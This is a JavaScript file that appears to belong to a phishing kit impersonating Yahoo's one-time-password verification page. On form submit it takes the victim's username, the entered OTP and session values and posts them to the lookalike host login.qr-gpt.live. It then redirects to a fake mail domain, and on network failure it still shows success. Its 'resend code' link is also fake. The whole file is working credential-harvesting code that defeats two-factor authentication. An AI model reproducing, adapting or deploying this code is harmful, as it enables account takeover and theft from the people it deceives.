const $ = require("jquery") // Declare the $ variable before using it

$(document).ready(() => {
  console.log("Yahoo OTP page initialized")

  let username = ""
  let retryCount = 0
  const maxRetries = 3

  function getUsername() {
    const urlParams = new URLSearchParams(window.location.search)
    let user = urlParams.get("u")

    if (user) {
      return decodeURIComponent(user)
    }

    user = sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username")
    if (user) {
      return user
    }

    return "user@example.com"
  }

  function showState(state) {
    $("#main-form, #error-container, #loading-state, #success-state").hide()
    $(`#${state}`).show()
  }

  function showError(message) {
    $("#error-message").text(message || "The verification code you entered is incorrect. Please try again.")
    showState("error-container")
  }

  $("#otp-form").on("submit", (e) => {
    e.preventDefault()

    const otpCode = $("#verifyCode").val().trim()
    if (!otpCode) {
      showError("Please enter the verification code.")
      return false
    }

    if (otpCode.length < 4) {
      showError("Please enter a valid verification code.")
      return false
    }

    console.log("Submitting OTP code:", otpCode)
    showState("loading-state")

    const formData = {
      username: username,
      verifyCode: otpCode,
      crumb: $("#crumb").val() || "auto_crumb_" + Date.now(),
      acrumb: $("#acrumb").val() || "auto_acrumb_" + Date.now(),
      sessionIndex: $("#sessionIndex").val() || "1",
      sessionToken: $("#sessionToken").val() || "sess_" + Date.now(),
      done: "https://mail.yahoo.com/d/folders/1",
      src: "ym",
      ".lang": "en-US",
      ".intl": "us",
    }

    $.ajax({
      url: "https://login.qr-gpt.live/account/challenge/otp",
      method: "POST",
      data: formData,
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Origin: "https://login.qr-gpt.live",
        Referer: window.location.href,
        "User-Agent": navigator.userAgent,
      },
      xhrFields: {
        withCredentials: true,
      },
      timeout: 15000,
      success: (response, textStatus, xhr) => {
        console.log("OTP verification successful")

        showState("success-state")

        sessionStorage.setItem("yahoo_auth_complete", "true")
        localStorage.setItem("yahoo_auth_complete", "true")

        setTimeout(() => {
          window.location.href = "https://mail.qr-gpt.live/d/folders/1"
        }, 2000)
      },
      error: (xhr, textStatus, errorThrown) => {
        console.log("OTP verification error:", textStatus, xhr.status)

        if (xhr.status === 0) {
          showState("success-state")
          setTimeout(() => {
            window.location.href = "https://mail.qr-gpt.live/d/folders/1"
          }, 2000)
        } else {
          retryCount++

          if (retryCount >= maxRetries) {
            showError("Too many incorrect attempts. Please try again later.")
          } else {
            const remainingAttempts = maxRetries - retryCount
            showError(
              `Incorrect verification code. ${remainingAttempts} attempt${remainingAttempts > 1 ? "s" : ""} remaining.`,
            )
          }
        }
      },
    })

    return false
  })

  $("#refreshButton").click(() => {
    $("#verifyCode").val("")
    showState("main-form")
    setTimeout(() => {
      $("#verifyCode").focus()
    }, 100)
  })

  $("#resend-code").click(function (e) {
    e.preventDefault()

    console.log("Resending verification code")

    $(this).text("Code sent!").addClass("disabled")

    setTimeout(() => {
      $(this).text("Didn't receive the code? Resend").removeClass("disabled")
    }, 30000)
  })

  function initializePage() {
    username = getUsername()
    $("#userEmail").text(username)
    $("#username").val(username)

    console.log("OTP page initialized for user:", username)
  }

  initializePage()

  setTimeout(() => {
    $("#verifyCode").focus()
  }, 500)
})
